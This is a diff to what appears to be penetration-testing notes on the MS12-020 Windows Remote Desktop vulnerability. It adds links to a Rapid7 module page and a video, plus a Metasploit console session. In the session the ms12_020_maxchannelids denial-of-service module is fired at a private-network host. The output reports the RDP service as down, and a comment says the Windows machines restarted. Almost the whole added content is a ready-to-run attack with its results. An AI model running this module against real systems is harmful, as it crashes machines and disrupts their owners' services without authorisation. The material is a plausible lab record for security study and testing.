@@ -1,6 +1,17 @@
 https://www.rapid7.com/db/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 https://www.youtube.com/watch?v=8FhEK296jPg
 
+msf exploit(ms05_017_msmq) > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+msf auxiliary(ms12_020_maxchannelids) > set RHOST 192.168.0.33
+msf auxiliary(ms12_020_maxchannelids) > exploit
+
+[*] 192.168.0.33:3389 - 192.168.0.33:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+[*] 192.168.0.33:3389 - 192.168.0.33:3389 - 210 bytes sent
+[*] 192.168.0.33:3389 - 192.168.0.33:3389 - Checking RDP status...
+[+] 192.168.0.33:3389 - 192.168.0.33:3389 seems down
+[*] Auxiliary module execution completed
+
+# Windows computers restarted
 
 
 Potential Vulnerability:
